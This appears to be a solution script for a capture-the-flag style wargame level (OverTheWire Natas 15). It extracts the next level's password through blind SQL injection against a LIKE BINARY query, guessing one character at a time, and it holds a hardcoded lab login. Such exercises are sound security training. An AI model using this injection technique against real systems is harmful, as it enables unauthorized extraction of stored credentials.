import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas15.natas.labs.overthewire.org/"
characters = ascii_uppercase + ascii_lowercase + digits
sql_injection = 'natas16" AND password LIKE BINARY "'

session = requests.Session()
session.auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

password = ""

while len(password) < 33:
    for character in characters:
        request = session.post('http://natas15.natas.labs.overthewire.org/', data={'username':sql_injection + password + character + "%"})
        if "This user exists" in request.text:
            sys.stdout.write(character)
            sys.stdout.flush()
            password += character
            break

print(password)